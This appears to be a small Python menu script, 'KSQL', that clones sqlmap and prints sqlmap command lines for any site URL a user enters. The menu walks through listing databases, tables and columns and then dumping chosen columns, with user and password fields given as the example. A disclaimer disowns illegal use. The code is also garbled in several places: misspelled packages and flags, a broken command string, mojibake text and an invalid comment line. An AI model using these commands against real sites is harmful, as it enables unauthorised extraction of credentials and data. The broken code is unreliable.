# python 3.7.1
-*- coding: UTF-8 -*-
import os

os.system('apt update && upgrade')
os.system('pkg install figler')
os.system('pkg install git')
os.system('pkg install python')
os.system('pkg install python2 ')
os.system('git clone https://github.com/sqlmapproject/sqlmap')


while True:
  os.system('clear')
  os.system('figlet KSQL ')
  print('Safe Pente st Devolper By KUZGUN')
  os.system('clear')
  print("YapÄ±labilecek hic bir yasadÄ±ÅŸÄ± faliyetten biz sorumlu deÄŸiliz.(We are not responsible for any illegal activity that can be done.)  \n \n")
  print(" 1=database \n 2=tables \n 3=colums \n  4=dump \n 5=Ã§Ä±kÄ±ÅŸ(exit) \n")

  secim=int(input("seÃ§iminizi giriniz:"))

  if secim== 1:
    site=str(input("site:"))
    print("python2 sqlmap.py -u ",site," --dbs")

  elif secim ==2:
    site=str(input("site:"))
    db=str(input("database:"))
    print("python2 sqlmap.py -u ",site," -D ",db ," --tables")

  elif secim==3:
    site=str(input("site:"))
    db=str(input("database:"))
    table=str(input( "tables:"))
    print("python2 sqlmap.p y -u ",site," -D ",db, " -T ",table ," --colums")

  elif secim==4:
    site=str(input("site:"))
    db=str(input("database:"))
    table=str(input("tables:"))
    colum=str(input("colums(exemples:user,passwd,r oot):"))
    print("python2 sqlmap.py -u ",site," -D ",db ," -T ",table ," -C ",colum," --dump")

  elif 5==secim:
    break

  else:
    print("LÃ¼tfen tekrar deneyiniz(try again)")
